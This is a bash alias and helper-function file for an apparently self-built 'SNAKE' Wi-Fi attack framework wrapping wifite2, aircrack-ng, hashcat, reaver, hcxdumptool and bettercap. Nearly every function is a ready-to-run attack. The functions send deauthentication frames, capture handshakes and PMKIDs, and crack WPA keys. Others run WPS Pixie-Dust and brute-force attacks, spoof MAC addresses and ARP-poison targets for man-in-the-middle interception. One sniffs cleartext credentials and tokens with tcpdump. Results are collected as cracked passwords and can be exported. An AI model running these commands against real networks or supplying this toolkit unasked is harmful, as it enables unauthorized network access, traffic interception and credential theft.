#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════╗
# ║  SNAKE Framework — Bash Aliases & Helper Functions       ║
# ║  Source this file: source /home/kali/wifite2/snake.sh   ║
# ║  Or add to ~/.bashrc:  source ~/wifite2/snake.sh         ║
# ╚══════════════════════════════════════════════════════════╝

SNAKE_DIR="${SNAKE_DIR:-$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)}"
SNAKE_PY="$SNAKE_DIR/snake.py"
WIFITE_PY="$SNAKE_DIR/Wifite.py"
if [[ -x "$SNAKE_DIR/.venv/bin/python" ]]; then
    SNAKE_PYTHON="$SNAKE_DIR/.venv/bin/python"
else
    SNAKE_PYTHON="python3"
fi

# Colors
_G='\033[92m'; _Y='\033[93m'; _R='\033[91m'; _C='\033[96m'; _B='\033[1m'; _X='\033[0m'

# ─────────────────────────────────────────────────────────────
# Core Snake commands
# ─────────────────────────────────────────────────────────────

# Launch Snake web control panel (port 5000)
alias snake='sudo "$SNAKE_PYTHON" "$SNAKE_PY" server'
alias snake-server='sudo "$SNAKE_PYTHON" "$SNAKE_PY" server'
alias snake-debug='sudo "$SNAKE_PYTHON" "$SNAKE_PY" server --debug'
alias snake-status='"$SNAKE_PYTHON" "$SNAKE_PY" status'
alias snake-doctor='"$SNAKE_PYTHON" "$SNAKE_PY" doctor'
alias snake-help='"$SNAKE_PYTHON" "$SNAKE_PY" --help'

# ─────────────────────────────────────────────────────────────
# Network scanning aliases
# ─────────────────────────────────────────────────────────────

# snake-scan <interface> [seconds]
snake-scan() {
    local iface="${1:-wlan0}"
    local time="${2:-45}"
    sudo "$SNAKE_PYTHON" "$SNAKE_PY" scan -i "$iface" -t "$time"
}

# Quick 30s scan on default interface
alias snake-quick='snake-scan wlan0 30'

# ─────────────────────────────────────────────────────────────
# Monitor mode management
# ─────────────────────────────────────────────────────────────

# Enable monitor mode: snake-mon [interface]
snake-mon() {
    local iface="${1:-wlan0}"
    echo -e "${_G}[🐍] Enabling monitor mode on ${_B}${iface}${_X}..."
    sudo "$SNAKE_PYTHON" "$SNAKE_PY" monitor -i "$iface"
}

# Disable monitor mode: snake-managed [interface]
snake-managed() {
    local iface="${1:-wlan0mon}"
    echo -e "${_Y}[*] Switching ${iface} to managed mode...${_X}"
    sudo "$SNAKE_PYTHON" "$SNAKE_PY" managed -i "$iface"
}

# Auto-detect and enable monitor mode on first wireless interface
snake-mon-auto() {
    local iface
    iface=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
    if [[ -z "$iface" ]]; then
        echo -e "${_R}[!] No wireless interface found${_X}"
        return 1
    fi
    echo -e "${_G}[*] Found interface: ${_B}${iface}${_X}"
    snake-mon "$iface"
}

# ─────────────────────────────────────────────────────────────
# Cracking shortcuts
# ─────────────────────────────────────────────────────────────

# Crack a .cap file: snake-crack <file.cap> [bssid] [essid]
snake-crack() {
    local file="${1:-}"
    local bssid="${2:-00:00:00:00:00:00}"
    local essid="${3:-Unknown}"
    if [[ -z "$file" ]]; then
        echo -e "${_R}Usage: snake-crack <file.cap> [bssid] [essid]${_X}"
        return 1
    fi
    sudo "$SNAKE_PYTHON" "$SNAKE_PY" crack --file "$file" --bssid "$bssid" --essid "$essid"
}

# Crack latest handshake in hs/ directory
snake-crack-latest() {
    local latest
    latest=$(ls -t "$SNAKE_DIR/hs/"*.cap 2>/dev/null | head -1)
    if [[ -z "$latest" ]]; then
        echo -e "${_R}[!] No .cap files found in $SNAKE_DIR/hs/${_X}"
        return 1
    fi
    echo -e "${_G}[*] Cracking: ${_B}${latest}${_X}"
    snake-crack "$latest"
}

# ─────────────────────────────────────────────────────────────
# Wifite2 shortcuts
# ─────────────────────────────────────────────────────────────

# Full wifite2 run: wifite-auto [interface]
wifite-auto() {
    local iface="${1:-wlan0mon}"
    echo -e "${_G}[🐍] Launching wifite2 on ${_B}${iface}${_X}..."
    sudo python3 "$WIFITE_PY" \
        --interface "$iface" \
        --kill \
        --wpa \
        --no-wps \
        --dict "${SNAKE_DIR}/snakefw/wordlists/snake-smart.txt" 2>/dev/null \
        || sudo python3 "$WIFITE_PY" --interface "$iface" --kill --wpa --no-wps
}

# Wifite WPS only
wifite-wps() {
    local iface="${1:-wlan0mon}"
    sudo python3 "$WIFITE_PY" --interface "$iface" --kill --wps
}

# Wifite PMKID only
wifite-pmkid() {
    local iface="${1:-wlan0mon}"
    sudo python3 "$WIFITE_PY" --interface "$iface" --kill --pmkid
}

# ─────────────────────────────────────────────────────────────
# Aircrack-ng shortcuts
# ─────────────────────────────────────────────────────────────

# Start capture: snake-capture <iface_mon> <bssid> <channel> [out]
snake-capture() {
    local iface="${1:-wlan0mon}"
    local bssid="${2:-}"
    local ch="${3:-6}"
    local out="${4:-$SNAKE_DIR/snakefw/captures/cap_$(date +%s)}"
    if [[ -z "$bssid" ]]; then
        echo -e "${_R}Usage: snake-capture <iface_mon> <bssid> <channel>${_X}"
        return 1
    fi
    echo -e "${_G}[*] Capturing on ${iface}, BSSID=${bssid}, CH=${ch}${_X}"
    echo -e "${_Y}[*] Press Ctrl+C to stop capture${_X}"
    sudo airodump-ng -c "$ch" --bssid "$bssid" -w "$out" "$iface"
}

# Deauth a client: snake-deauth <iface_mon> <ap_bssid> [client_bssid]
snake-deauth() {
    local iface="${1:-wlan0mon}"
    local ap="${2:-}"
    local client="${3:-FF:FF:FF:FF:FF:FF}"
    if [[ -z "$ap" ]]; then
        echo -e "${_R}Usage: snake-deauth <iface_mon> <ap_bssid> [client]${_X}"
        return 1
    fi
    echo -e "${_R}[⚡] Sending deauth to ${client} on AP ${ap}${_X}"
    sudo aireplay-ng --deauth 5 -a "$ap" -c "$client" "$iface"
}

# Crack .cap with aircrack-ng: snake-aircrack <file.cap> <bssid> [wordlist]
snake-aircrack() {
    local cap="${1:-}"
    local bssid="${2:-}"
    local wl="${3:-$SNAKE_DIR/snakefw/wordlists/snake-smart.txt}"
    [[ ! -f "$wl" ]] && wl="$SNAKE_DIR/wordlist-top4800-probable.txt"
    if [[ -z "$cap" || -z "$bssid" ]]; then
        echo -e "${_R}Usage: snake-aircrack <file.cap> <bssid> [wordlist]${_X}"
        return 1
    fi
    echo -e "${_G}[*] Cracking with aircrack-ng...${_X}"
    sudo aircrack-ng -w "$wl" -b "$bssid" "$cap"
}

# ─────────────────────────────────────────────────────────────
# Hashcat shortcuts
# ─────────────────────────────────────────────────────────────

# Convert .cap to hashcat format: snake-2hc <file.cap>
snake-2hc() {
    local cap="${1:-}"
    if [[ -z "$cap" ]]; then
        echo -e "${_R}Usage: snake-2hc <file.cap>${_X}"
        return 1
    fi
    local out="${cap%.cap}.hc22000"
    echo -e "${_G}[*] Converting to hc22000...${_X}"
    hcxpcapngtool -o "$out" "$cap" && echo -e "${_G}[+] Output: $out${_X}"
}

# Hashcat crack: snake-hashcat <file.hc22000> [wordlist]
snake-hashcat() {
    local hc="${1:-}"
    local wl="${2:-$SNAKE_DIR/snakefw/wordlists/snake-smart.txt}"
    [[ ! -f "$wl" ]] && wl="$SNAKE_DIR/wordlist-top4800-probable.txt"
    if [[ -z "$hc" ]]; then
        echo -e "${_R}Usage: snake-hashcat <file.hc22000> [wordlist]${_X}"
        return 1
    fi
    echo -e "${_G}[⚡] Running hashcat (mode 22000)...${_X}"
    hashcat -m 22000 -a 0 "$hc" "$wl" --status --status-timer=10
}

# ─────────────────────────────────────────────────────────────
# PMKID attack
# ─────────────────────────────────────────────────────────────

# PMKID capture: snake-pmkid <iface_mon> <bssid> [out]
snake-pmkid() {
    local iface="${1:-wlan0mon}"
    local bssid="${2:-}"
    local out="${3:-$SNAKE_DIR/snakefw/captures/pmkid_$(date +%s).pcapng}"
    if [[ -z "$bssid" ]]; then
        echo -e "${_R}Usage: snake-pmkid <iface_mon> <bssid>${_X}"
        return 1
    fi
    echo -e "${_G}[*] Capturing PMKID on ${iface} for ${bssid}...${_X}"
    echo -e "${_Y}[*] Ctrl+C to stop (takes ~10-30s)${_X}"
    sudo hcxdumptool -i "$iface" \
        --filterlist_ap "$bssid" --filtermode 2 \
        -o "$out" --active_beacon --enable_status=1
    echo -e "${_G}[*] Converting to hc22000...${_X}"
    local hc="${out%.pcapng}.hc22000"
    hcxpcapngtool -o "$hc" "$out" && \
        echo -e "${_G}[+] Ready for hashcat: ${_B}${hc}${_X}" && \
        snake-hashcat "$hc"
}

# ─────────────────────────────────────────────────────────────
# WPS attacks
# ─────────────────────────────────────────────────────────────

# Pixie dust: snake-pixie <iface_mon> <bssid>
snake-pixie() {
    local iface="${1:-wlan0mon}"
    local bssid="${2:-}"
    if [[ -z "$bssid" ]]; then
        echo -e "${_R}Usage: snake-pixie <iface_mon> <bssid>${_X}"
        return 1
    fi
    echo -e "${_G}[✨] Running WPS Pixie-Dust on ${bssid}...${_X}"
    sudo reaver -i "$iface" -b "$bssid" -vvv -K 1
}

# WPS bruteforce: snake-wps <iface_mon> <bssid>
snake-wps() {
    local iface="${1:-wlan0mon}"
    local bssid="${2:-}"
    if [[ -z "$bssid" ]]; then
        echo -e "${_R}Usage: snake-wps <iface_mon> <bssid>${_X}"
        return 1
    fi
    echo -e "${_Y}[🔨] Running WPS Bruteforce on ${bssid}...${_X}"
    sudo reaver -i "$iface" -b "$bssid" -vvv
}

# ─────────────────────────────────────────────────────────────
# MAC address management
# ─────────────────────────────────────────────────────────────

# Random MAC: snake-mac <interface>
snake-mac() {
    local iface="${1:-wlan0}"
    echo -e "${_G}[🎭] Randomizing MAC on ${iface}...${_X}"
    sudo ip link set "$iface" down
    sudo macchanger -r "$iface"
    sudo ip link set "$iface" up
}

# Reset MAC: snake-mac-reset <interface>
snake-mac-reset() {
    local iface="${1:-wlan0}"
    echo -e "${_Y}[*] Resetting MAC on ${iface}...${_X}"
    sudo ip link set "$iface" down
    sudo macchanger -p "$iface"
    sudo ip link set "$iface" up
}

# ─────────────────────────────────────────────────────────────
# Results management
# ─────────────────────────────────────────────────────────────

# Show all cracked passwords
alias snake-show='"$SNAKE_PYTHON" "$SNAKE_PY" status'

# Watch cracked.json live
alias snake-watch='watch -n 2 "\"$SNAKE_PYTHON\" \"$SNAKE_PY\" status"'

# Export cracked to desktop
snake-export() {
    local dst="${1:-$HOME/Desktop/snake_cracked_$(date +%Y%m%d_%H%M%S).json}"
    cp "$SNAKE_DIR/cracked.json" "$dst" 2>/dev/null || \
    cp "$SNAKE_DIR/snakefw/results/cracked.json" "$dst" 2>/dev/null
    echo -e "${_G}[+] Exported to: ${_B}${dst}${_X}"
}

# ─────────────────────────────────────────────────────────────
# System helpers
# ─────────────────────────────────────────────────────────────

# Kill all interfering WiFi processes
alias snake-kill='sudo airmon-ng check kill'

# List wireless interfaces with mode
snake-iw() {
    echo -e "${_C}${_B}Wireless Interfaces:${_X}"
    iw dev 2>/dev/null | awk '/Interface/{print "  "$2}' | while read -r i; do
        local mode
        mode=$(iwconfig "${i##  }" 2>/dev/null | grep -oP 'Mode:\K\w+' || echo "?")
        echo -e "  ${_G}${i##  }${_X}  [${_Y}${mode}${_X}]"
    done
}

# Check all Snake tools
snake-tools() {
    echo -e "${_C}${_B}Snake Tool Status:${_X}"
    local tools=(airmon-ng airodump-ng aireplay-ng aircrack-ng hashcat hcxdumptool hcxpcapngtool reaver bully macchanger tshark nmap cowpatty)
    for t in "${tools[@]}"; do
        if command -v "$t" &>/dev/null; then
            echo -e "  ${_G}✓${_X} $t"
        else
            echo -e "  ${_R}✗${_X} $t"
        fi
    done
}

# ─────────────────────────────────────────────────────────────
# Print Snake help
# ─────────────────────────────────────────────────────────────
snake-help() {
    echo -e "
${_G}${_B}🐍 SNAKE Framework — Quick Reference${_X}
${_G}═══════════════════════════════════════${_X}

${_C}${_B}Server:${_X}
  snake / snake-server     Start web control panel (port 5000)
  snake --port 8080        Custom port
  snake-status             Show cracked passwords (CLI)
  snake-doctor             Check dependencies and readiness

${_C}${_B}Interface:${_X}
  snake-iw                 List wireless interfaces
  snake-mon [iface]        Enable monitor mode
  snake-managed [iface]    Enable managed mode
  snake-mon-auto           Auto-detect & enable monitor
  snake-kill               Kill interfering processes

${_C}${_B}Scanning:${_X}
  snake-scan [iface] [t]   Scan for networks (default 45s)
  snake-quick              Quick 30s scan on wlan0

${_C}${_B}Attacks:${_X}
  snake-capture i b ch     airodump-ng capture
  snake-deauth i ap [cli]  Send deauth frames
  snake-pmkid i bssid      Full PMKID attack pipeline
  snake-pixie i bssid      WPS Pixie-Dust (reaver)
  snake-wps i bssid        WPS Bruteforce (reaver)
  wifite-auto [iface]      Full wifite2 automation

${_C}${_B}Cracking:${_X}
  snake-crack <cap> b e    Crack .cap file
  snake-crack-latest       Crack latest .cap in hs/
  snake-2hc <cap>          Convert .cap to hc22000
  snake-hashcat <hc22k>    Hashcat mode 22000
  snake-aircrack <cap> b   aircrack-ng

${_C}${_B}Results:${_X}
  snake-show               Show cracked passwords
  snake-watch              Watch cracked.json live
  snake-export [path]      Export cracked.json
  snake-tools              Check all tools
  snake-mac [iface]        Randomize MAC address
  snake-mac-reset [iface]  Reset MAC address

${_G}═══════════════════════════════════════${_X}
"
}

# ─────────────────────────────────────────────────────────────
# MITM Attack shortcuts
# ─────────────────────────────────────────────────────────────

# Enable IP forwarding (required for MITM)
snake-ipfwd-on()  { echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null && echo -e "${_G}[+] IP forwarding enabled${_X}"; }
snake-ipfwd-off() { echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null && echo -e "${_Y}[*] IP forwarding disabled${_X}"; }
snake-ipfwd-status() { local v; v=$(cat /proc/sys/net/ipv4/ip_forward); echo -e "IP forwarding: $([ "$v" = "1" ] && echo "${_G}ON${_X}" || echo "${_R}OFF${_X}")"; }

# ARP poison a target (Scapy/bettercap): snake-mitm <iface> <target-ip> <gateway-ip>
snake-mitm() {
    local iface="${1:-wlan0}"
    local target="${2:-}"
    local gw="${3:-$(ip route show default | awk '/default/{print $3}')}"
    if [[ -z "$target" ]]; then
        echo -e "${_R}Usage: snake-mitm <iface> <target-ip> [gateway]${_X}"
        return 1
    fi
    echo -e "${_G}[🎯] MITM: ${target} ↔ ${gw} via ${iface}${_X}"
    snake-ipfwd-on
    # Use bettercap if available
    if command -v bettercap &>/dev/null; then
        echo -e "${_C}[*] Using bettercap...${_X}"
        local cap="/tmp/snake_mitm_$$.cap"
        cat > "$cap" << CAPEOF
set arp.spoof.targets $target
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
CAPEOF
        sudo bettercap --iface "$iface" --caplet "$cap" --no-colors
    else
        echo -e "${_C}[*] Using arpspoof fallback...${_X}"
        sudo arpspoof -i "$iface" -t "$target" "$gw" &
        sudo arpspoof -i "$iface" -t "$gw" "$target" &
        echo -e "${_Y}[*] Press Ctrl+C to stop MITM${_X}"
        trap "snake-mitm-stop $target $gw $iface" INT
        wait
    fi
}

# Stop MITM and restore ARP
snake-mitm-stop() {
    local target="${1:-}"; local gw="${2:-}"; local iface="${3:-wlan0}"
    echo -e "${_Y}[*] Stopping MITM...${_X}"
    pkill -f "arpspoof" 2>/dev/null
    pkill -f "bettercap" 2>/dev/null
    # Restore ARP
    if [[ -n "$target" && -n "$gw" ]]; then
        sudo arp -s "$target" "$(arp -n $target 2>/dev/null | awk 'NR==2{print $3}')" 2>/dev/null || true
    fi
    snake-ipfwd-off
    echo -e "${_G}[+] MITM stopped. ARP restored.${_X}"
}

# Quick bettercap interactive session
snake-bettercap() {
    local iface="${1:-wlan0}"
    echo -e "${_G}[🐍] Starting bettercap on ${iface}...${_X}"
    sudo bettercap --iface "$iface"
}

# Bettercap sniffer only (no ARP spoof)
snake-sniff() {
    local iface="${1:-wlan0}"
    echo -e "${_G}[📡] Sniffing on ${iface}...${_X}"
    local cap="/tmp/snake_sniff_$$.cap"
    cat > "$cap" << CAPEOF
net.sniff on
set net.sniff.verbose true
CAPEOF
    sudo bettercap --iface "$iface" --caplet "$cap" --no-colors
}

# Bettercap local network discovery + probe
snake-netmap() {
    local iface="${1:-wlan0}"
    echo -e "${_G}[🔍] Mapping local network on ${iface}...${_X}"
    local cap="/tmp/snake_probe_$$.cap"
    cat > "$cap" << CAPEOF
net.probe on
net.show
CAPEOF
    sudo bettercap --iface "$iface" --caplet "$cap" --no-colors
}

# tcpdump credential sniffer (HTTP cleartext)
snake-credsniff() {
    local iface="${1:-wlan0}"
    echo -e "${_R}[🔑] Sniffing cleartext credentials on ${iface}...${_X}"
    echo -e "${_Y}[*] Ctrl+C to stop${_X}"
    sudo tcpdump -i "$iface" -A -s 0 'tcp port 80 or tcp port 8080' 2>/dev/null | \
        grep -iE '(user|pass|login|email|username|password|pwd|token|auth)[=: ]+[^ &\n]{2,}'
}

# MITM via web panel (browser-based)
alias snake-mitm-ui='xdg-open http://localhost:5000 2>/dev/null; echo -e "${_G}[*] Open → MITM tab in the control panel${_X}"'

# ─────────────────────────────────────────────────────────────
# Auto-print loaded message
# ─────────────────────────────────────────────────────────────
echo -e "${_G}${_B}[🐍] Snake aliases loaded!${_X} Type ${_C}snake-help${_X} for all commands."
